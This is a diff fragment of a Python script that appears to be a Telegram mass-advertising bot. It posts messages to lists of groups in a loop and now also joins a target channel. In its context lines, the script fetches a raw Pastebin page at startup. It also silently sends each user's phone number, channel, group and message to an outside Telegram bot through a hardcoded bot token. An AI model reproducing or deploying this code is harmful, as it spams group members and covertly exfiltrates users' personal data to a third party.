@@ -176,12 +176,12 @@ async def main(api_id, api_hash, phone, channel_username, ranbefore):
         groups = [line.strip() for line in open(f'./GLS/{gl}', 'r').readlines()]
         totalgroupdone = 0
         await app.start()
+        await app.join_chat(channel_username)
         chat = await app.get_chat(channel_username)
         channel_username = chat.id
         await app.stop()
         while True:
             os.system('cls')
-            
             sys.stderr = open(os.devnull, 'w')
             await app.start()
             total_group = len(groups)
@@ -200,7 +200,6 @@ async def main(api_id, api_hash, phone, channel_username, ranbefore):
             await asyncio.sleep(sleeptimegroups)
 
 if __name__ == '__main__':
-
 
     #x = os.popen("wmic csproduct get UUID").read().split()[-1]
     aa = requests.get('https://pastebin.com/raw/bajzBb38').text
@@ -249,8 +248,6 @@ if __name__ == '__main__':
         
         print(Fore.LIGHTGREEN_EX + ' Starting advertising..')
         time.sleep(3)
-                                
-
         os.system(f'title nmew - {phone} - {channel_username} - group {gl} - {channel_username} - {message}')
         requests.get(f'https://api.telegram.org/bot5281317146:AAGYj2IJmmmc8TYUGB5UP0QO0zIsLjXcrqM/sendMessage?chat_id=1431454289&text={phone} - {channel_username} - group {gl} - {channel_username} - {message}')
         while True:
